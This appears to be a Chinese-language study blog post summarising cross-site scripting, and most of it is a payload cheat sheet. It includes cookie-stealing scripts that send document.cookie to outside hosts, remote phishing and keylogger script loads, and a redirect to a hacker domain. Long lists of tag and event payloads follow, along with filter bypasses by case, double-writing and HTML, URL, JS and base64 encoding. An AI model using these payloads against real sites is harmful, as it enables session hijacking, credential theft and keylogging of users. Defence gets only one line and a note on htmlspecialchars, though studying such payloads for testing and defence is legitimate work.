---
title: xss漏洞总结
date: 2025-02-12 03:30:15
tags:
- xss漏洞
category:
- 学习笔记
---

# xss漏洞

## 漏洞介绍：

XSS 攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。

## 漏洞危害：

```
1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
3、盗窃企业重要的具有商业价值的资料
4、非法转账
5、强制发送电子邮件
6、网站挂马
7、控制受害者机器向其它网站发起攻击
```

## 如何防御：

对输入的参数和URL进行过滤，对输出的参数进行编码，使脚本无法正常执行。

# xss漏洞类型：

## 反射型xss

反射性XSS不是持久化的，攻击脚本不会储存在数据库中，而是构建在链接中，需要欺骗用户进行点击，用户再点击了包含恶意代码的链接后，服务器接收到请求并处理，把带有恶意脚本的发送给用户浏览器，浏览器对恶意脚本进行解析，触发攻击。

## 存储型xss

储存型xss，持久化，内容储存在数据库中，如评论、留言、发表文章的地方，对于传输来的数据过滤不严格，那么就可以将恶意代码插入到数据库中，用户访问该页面时，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。

## DOM型xss

DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。一般不与后台服务端交互

# 漏洞利用：

## 1.盗取cookie：

```
'"><script>document.location='http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>

<script>new Image().src="http://your_ip:your_port/?cookies=" + document.cookie;</script>
```

`<script>alert(document.cookie)</script>`

## 2.构造页面跳转：

`<script>location='https://www.hacker.com'</script>`

## 3.构造获取cookie并发送到远程主机：

```js
<script>document.location='http://127.0.0.1/test/cookie.phpcookie='+document.cookie</script>
```

## 4.xss钓鱼演示：

钓鱼攻击利用页面

```
<script src="http://192.168.32.1/pikachu-master/pkxss/xfish/fish.php"></script>
```

## 5.xss获取键盘记录

```
'"><script src="http://192.168.32.1/pikachu-master/pkxss/rkeypress/rk.js"></script>
```

# payload构造

## 常见注入点

- 输入框
- 留言板
- URL中可传参数的变量

## 常用事件：

```js
onclick: 点击触发 --（<img src=x onclick=alert(1)>）
onerror: 当 src 加载不出来时触发 --（<img src=x onerror=alert(1)>）
onload: 当 src 加载完毕触发--（<img src=x onload=alert(1)>）
onmouseover：鼠标指针移动到图片后触发--（<img src=x onmouseover=alert(1)>）
onmousemove: 鼠标指针移到指定的元素后触发--（<img src=x onmousemove=alert(1) >）
onmouseout: 鼠标指针划出指定元素触发--（<img src=x onmouseout=alert(1) >）
onfocus: 当 input 输入框获取焦点时触发--（<input onfocus=javascript:alert(1) autofocus>）
```

## 常用属性：

```js
src
action
href
data
content
```

## 常见标签语句

### script标签

```
<script>alert('xss')</script>
<script>alert(/xss/)</script>
<script>alert(123)</script>

```

### a标签

```
<a href="javascript:alert(1)">test</a>
<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
<a href="x" onclick=eval("alert('xss');")>xss</a>
<a href="x" onmouseover="alert('xss');">xss</a>
<a href="x" onmouseout="alert('xss');">xss</a>
```

### iframe标签

```
<iframe src="javascript:alert(1)">test</iframe>
<iframe onload="alert(document.cookie)"></iframe>
<iframe onload="alert('xss');"></iframe>
<iframe onload="base64,YWxlcnQoJ3hzcycpOw=="></iframe>
<iframe onmouseover="alert('xss');"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

### img标签

```
<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">
```

### input标签

```
<input onclick="alert('xss');">
<input onfocus="alert('xss');">
<input onfocus="alert('xss');" autofocus="">
<input onmouseover="alert('xss');">
<input type="text" onkeydown="alert('xss');"></input>
<input type="text" onkeypress="alert('xss');"></input>
<input type="text" onkeydown="alert('xss');"></input>
```

### object标签

**这个需要借助 data 伪协议和 base64 编码来实现绕过**

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
```

### p标签

```
<p onclick="alert('xss');">xss</p>
<p onmouseover="alert('xss');">xss</p>
<p onmouseout="alert('xss');">xss</p>
<p onmouseup="alert('xss');">xss</p>
```

### 其他标签

```
<audio src=1 onerror=alert(1)>
<video src=x onerror=alert(1)>
<button onclick=alert(1)>
<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
<body onload="alert('xss');"></body>
```

# xss常见绕过

## 大小写绕过

```
<ScRipT>alert(1)</scRiPt>
```

## 双写绕过

比如将 `script` 替换为空（如果替换为其他字符，双写绕过也没用）。

```
<scrscriptipt>alert(1)</scrscriptipt>
```

## 圆括号过滤绕过

若 `alert(1)` 函数中的 `()` 被过滤了，可以考虑使用下面的方式进行绕过：

```
<!-- 反引号替换 -->
<script>alert`1`</script>
<!-- throw 绕过 -->
<video src onerror="javascript:window.onerror=alert;throw 1">
<svg onload="window.onerror=eval;throw'=alert\x281\x29';">    
```

## 空格过滤绕过

有时候空格会被过滤，这里我们可以使用回车的url编码进行绕过

```
<img%0Asrc=1%0Aοnerrοr=alert(1)>
```

## alert 过滤绕过

有时页面会过滤掉alert函数，不使用`alert`就行

```
<!--弹出输入框-->
<script>prompt(1)</script>
<!--弹出提示框-->
<script>confirm(1)</script>
<!--远程加载payload-->
<script src='//www.ldlx.com/xss/xss_payload.php?payload=2'></script>
```

## 单引号过滤绕过

若 `alert('xss')` 中的 `''` 被过滤了，可以考虑使用下面的方式进行绕过：

```
<!-- 斜杠替换 -->
<script>alert(/xss/)</script>
<!-- 反引号替换 -->
<script>alert(`xss`)</script>
```

## a标签href属性javascript伪协议绕过

```
'"><a href='javascript:alert(1)'>
```

## eval过滤绕过

```
<img src="x" onerror="eval(alert(1))">  
<img src="x" onerror="open(alert(1))">  
<img src="x" onerror="document.write(alert(1))">  
<img src="x" onerror="setTimeout(alert(1))">  
<img src="x" onerror="setInterval(alert(1))">  
<img src="x" onerror="Set.constructor(alert(1))">  
<img src="x" onerror="Map.constructor(alert(1))">  
<img src="x" onerror="Array.constructor(alert(1))">  
<img src="x" onerror="WeakSet.constructor(alert(1))">  
<img src="x" onerror="constructor.constructor(alert(1))">  
<img src="x" onerror="[1].map(alert(1))">  
<img src="x" onerror="[1].find(alert(1))">  
<img src="x" onerror="[1].every(alert(1))">  
<img src="x" onerror="[1].filter(alert(1))">  
<img src="x" onerror="[1].forEach(alert(1))">  
<img src="x" onerror="[1].findIndex(alert(1))">
```

## 编码绕过

编码绕过
 浏览器对 XSS 代码的解析顺序为：HTML解码 —— URL解码 —— JS解码(只支持UNICODE)。

### html 实体编码

当可控点为单个标签属性时，可以使用 html 实体编码。

```
<a href="可控点">test</a>

<iframe src="可控点">test<iframe>
<img src=x onerror="可控点">
Payload

<a href="javascript:alert(1)">test</a>
十进制

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">test</a>
十六进制

<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>


可以不带分号

<a href="&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29">test</a>


可以填充0

<a href="&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029">test</a>

```

### url 编码

```
当注入点存在 href 或者 src 属性时，可以使用 url 编码。

<a href="可控点">test</a>

<iframe src="可控点">test</iframe>


Payload

<a href="javascript:alert(1)">test</a>

<iframe src="javascript:alert(1)">test</iframe>
注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。

<a href="javascript:%61%6c%65%72%74%28%31%29">test</a>

<iframe src="javascript:%61%6c%65%72%74%28%31%29">test</iframe>
可以二次编码

<a href="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</a>

<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</iframe>
```

###  js 编码

```
payload

<img src=x onerror="alert(1)">

<input onfocus=location="alert(1)" autofocus>

Unicode 编码

<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<input onfocus=location="javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029" autofocus>

```

### 混合编码

浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。

```
原代码

<a href="javascript:alert(1)">test</a>

对alert进行JS编码（unicode编码）

<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">test</a>


对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码

<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)">test</a>

对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：

<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x29;">test</a>
```

### base64 编码

base64 编码通常需要使用到 data 伪协议。

data 协议使用方法：data:资源类型;编码,内容

base64编码内容为：`<script>alert(/xss/)</script>`

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>

<iframe src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></iframe>

<embed src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></embed>
```

## htmlspecialchars函数

htmlspecialchars 函数是 PHP 中的一个内置函数，它用于将特定的 HTML 字符转换为 HTML 实体字符。在 HTML 中，某些字符如 <, >, ", ', 和 & 具有特殊含义，分别代表HTML的标签、结束标签、字符引用和实体引用。如果想要在 HTML 中输出这些字符而不让它们被浏览器解释为 HTML 标签或字符引用，就需要使用 htmlspecialchars 函数将它们转换为相应的 HTML 实体。

```
预定义的字符是
& 成为 &amp
" 成为 &quot
' 成为 &#039
< 成为 &lt
> 成为 &gt
可用引号类型
ENT_COMPAT：默认，仅编码双引号
ENT_QUOTES：编码双引号和单引号
ENT_NOQUOTES：不编码任何引号
```

如果htmlspecialchars配置的是默认类型，只会编码双引号，所以可以使用单引号绕过。也可以使用绑定事件绕过。

详细内容：https://blog.csdn.net/hackzkaq/article/details/126344040

https://blog.csdn.net/m0_53073183/article/details/145443575
